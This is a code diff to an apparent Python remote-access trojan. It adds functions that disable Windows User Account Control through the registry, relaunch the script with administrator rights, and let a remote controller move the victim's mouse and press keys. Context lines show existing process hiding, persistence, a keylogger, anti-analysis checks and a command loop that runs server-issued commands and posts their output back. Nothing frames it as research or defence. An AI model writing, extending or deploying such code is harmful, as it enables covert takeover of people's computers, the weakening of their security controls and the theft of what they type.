@@ -55,6 +55,7 @@ try:
     import win32event
     import ctypes
     from ctypes import wintypes
+    import winreg
     WINDOWS_AVAILABLE = True
 except ImportError:
     WINDOWS_AVAILABLE = False
@@ -63,7 +64,7 @@ import pyaudio
 import base64
 import tempfile
 import pynput
-from pynput import keyboard
+from pynput import keyboard, mouse
 import pygame
 import io
 import wave
@@ -1654,6 +1655,44 @@ def hide_process():
         print(f"Failed to hide process: {e}")
         return False
 
+def disable_uac():
+    """Disable UAC (User Account Control) by modifying registry settings."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
+            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
+            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
+        print("[OK] UAC has been disabled.")
+        return True
+    except PermissionError:
+        print("[!] Access denied. Run this script as administrator.")
+        return False
+    except Exception as e:
+        print(f"[!] Error disabling UAC: {e}")
+        return False
+
+def run_as_admin():
+    """Relaunch the script with elevated privileges if not already admin."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    if not is_admin():
+        print("[!] Relaunching as Administrator...")
+        try:
+            # Relaunch with elevated privileges
+            ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, f'"{__file__}"', None, 1
+            )
+            sys.exit()
+        except Exception as e:
+            print(f"[!] Failed to relaunch as admin: {e}")
+            return False
+    return True
+
 def setup_persistence():
     """Setup persistence mechanisms."""
     if not WINDOWS_AVAILABLE:
@@ -2251,6 +2290,190 @@ def stop_voice_control():
         VOICE_CONTROL_THREAD = None
         print("Stopped voice control.")
 
+# --- Remote Control Functions ---
+
+# Global variables for remote control
+REMOTE_CONTROL_ENABLED = False
+MOUSE_CONTROLLER = None
+KEYBOARD_CONTROLLER = None
+
+def handle_remote_control(command_data):
+    """Handle remote control commands from the controller."""
+    global MOUSE_CONTROLLER, KEYBOARD_CONTROLLER
+    
+    # Initialize controllers if needed
+    if MOUSE_CONTROLLER is None:
+        MOUSE_CONTROLLER = mouse.Controller()
+    if KEYBOARD_CONTROLLER is None:
+        KEYBOARD_CONTROLLER = keyboard.Controller()
+    
+    try:
+        action = command_data.get("action")
+        data = command_data.get("data", {})
+        
+        if action == "mouse_move":
+            handle_mouse_move(data)
+        elif action == "mouse_click":
+            handle_mouse_click(data)
+        elif action == "key_down":
+            handle_key_down(data)
+        elif action == "key_up":
+            handle_key_up(data)
+        else:
+            print(f"Unknown remote control action: {action}")
+            
+    except Exception as e:
+        print(f"Error handling remote control command: {e}")
+
+def handle_mouse_move(data):
+    """Handle mouse movement commands."""
+    try:
+        x = data.get("x", 0)  # Relative position (0-1)
+        y = data.get("y", 0)  # Relative position (0-1)
+        sensitivity = data.get("sensitivity", 1.0)
+        
+        # Get screen dimensions
+        import mss
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]  # Primary monitor
+            screen_width = monitor["width"]
+            screen_height = monitor["height"]
+        
+        # Convert relative position to absolute
+        abs_x = int(x * screen_width * sensitivity)
+        abs_y = int(y * screen_height * sensitivity)
+        
+        # Move mouse
+        MOUSE_CONTROLLER.position = (abs_x, abs_y)
+        
+    except Exception as e:
+        print(f"Error handling mouse move: {e}")
+
+def handle_mouse_click(data):
+    """Handle mouse click commands."""
+    try:
+        button = data.get("button", "left")
+        
+        if button == "left":
+            MOUSE_CONTROLLER.click(mouse.Button.left, 1)
+        elif button == "right":
+            MOUSE_CONTROLLER.click(mouse.Button.right, 1)
+        elif button == "middle":
+            MOUSE_CONTROLLER.click(mouse.Button.middle, 1)
+            
+    except Exception as e:
+        print(f"Error handling mouse click: {e}")
+
+def handle_key_down(data):
+    """Handle key press commands."""
+    try:
+        key = data.get("key")
+        code = data.get("code")
+        
+        if key:
+            # Map special keys
+            if key == "Enter":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.enter)
+            elif key == "Escape":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.esc)
+            elif key == "Backspace":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.backspace)
+            elif key == "Tab":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.tab)
+            elif key == "Shift":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.shift)
+            elif key == "Control":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.ctrl)
+            elif key == "Alt":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.alt)
+            elif key == "Delete":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.delete)
+            elif key == "Home":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.home)
+            elif key == "End":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.end)
+            elif key == "PageUp":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.page_up)
+            elif key == "PageDown":
+                KEYBOARD_CONTROLLER.press(keyboard.Key.page_down)
+            elif key.startswith("Arrow"):
+                direction = key[5:].lower()  # Remove "Arrow" prefix
+                if direction == "up":
+                    KEYBOARD_CONTROLLER.press(keyboard.Key.up)
+                elif direction == "down":
+                    KEYBOARD_CONTROLLER.press(keyboard.Key.down)
+                elif direction == "left":
+                    KEYBOARD_CONTROLLER.press(keyboard.Key.left)
+                elif direction == "right":
+                    KEYBOARD_CONTROLLER.press(keyboard.Key.right)
+            elif key.startswith("F") and key[1:].isdigit():
+                # Function keys
+                f_num = int(key[1:])
+                if 1 <= f_num <= 12:
+                    f_key = getattr(keyboard.Key, f"f{f_num}")
+                    KEYBOARD_CONTROLLER.press(f_key)
+            elif len(key) == 1:
+                # Regular character
+                KEYBOARD_CONTROLLER.press(key)
+                
+    except Exception as e:
+        print(f"Error handling key down: {e}")
+
+def handle_key_up(data):
+    """Handle key release commands."""
+    try:
+        key = data.get("key")
+        code = data.get("code")
+        
+        if key:
+            # Map special keys
+            if key == "Enter":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.enter)
+            elif key == "Escape":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.esc)
+            elif key == "Backspace":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.backspace)
+            elif key == "Tab":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.tab)
+            elif key == "Shift":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.shift)
+            elif key == "Control":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.ctrl)
+            elif key == "Alt":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.alt)
+            elif key == "Delete":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.delete)
+            elif key == "Home":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.home)
+            elif key == "End":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.end)
+            elif key == "PageUp":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.page_up)
+            elif key == "PageDown":
+                KEYBOARD_CONTROLLER.release(keyboard.Key.page_down)
+            elif key.startswith("Arrow"):
+                direction = key[5:].lower()  # Remove "Arrow" prefix
+                if direction == "up":
+                    KEYBOARD_CONTROLLER.release(keyboard.Key.up)
+                elif direction == "down":
+                    KEYBOARD_CONTROLLER.release(keyboard.Key.down)
+                elif direction == "left":
+                    KEYBOARD_CONTROLLER.release(keyboard.Key.left)
+                elif direction == "right":
+                    KEYBOARD_CONTROLLER.release(keyboard.Key.right)
+            elif key.startswith("F") and key[1:].isdigit():
+                # Function keys
+                f_num = int(key[1:])
+                if 1 <= f_num <= 12:
+                    f_key = getattr(keyboard.Key, f"f{f_num}")
+                    KEYBOARD_CONTROLLER.release(f_key)
+            elif len(key) == 1:
+                # Regular character
+                KEYBOARD_CONTROLLER.release(key)
+                
+    except Exception as e:
+        print(f"Error handling key up: {e}")
+
 # --- Keylogger Functions ---
 
 def on_key_press(key):
@@ -2631,6 +2854,17 @@ def main_loop(agent_id):
                 else:
                     output = "Invalid terminate-process command format"
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+            elif command.startswith("{") and "remote_control" in command:
+                # Handle remote control commands (JSON format)
+                try:
+                    import json
+                    command_data = json.loads(command)
+                    if command_data.get("type") == "remote_control":
+                        handle_remote_control(command_data)
+                        # Send success response
+                        requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": "Remote control command executed"})
+                except Exception as e:
+                    requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": f"Remote control error: {e}"})
             elif command != "sleep":
                 output = execute_command(command)
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
@@ -2924,7 +3158,24 @@ def kill_task_manager():
         return f"Task Manager termination failed: {e}"
 
 if __name__ == "__main__":
-    # Run anti-analysis checks first
+    # Run UAC checks and elevation FIRST
+    if WINDOWS_AVAILABLE:
+        # Try to run as admin first
+        if not is_admin():
+            print("Attempting to run as administrator...")
+            if run_as_admin():
+                # Script will restart with admin privileges
+                sys.exit()
+        
+        # If we're admin, disable UAC
+        if is_admin():
+            print("Running with administrator privileges")
+            if disable_uac():
+                print("UAC disabled successfully")
+            else:
+                print("Could not disable UAC")
+    
+    # Run anti-analysis checks
     try:
         anti_analysis()
     except:
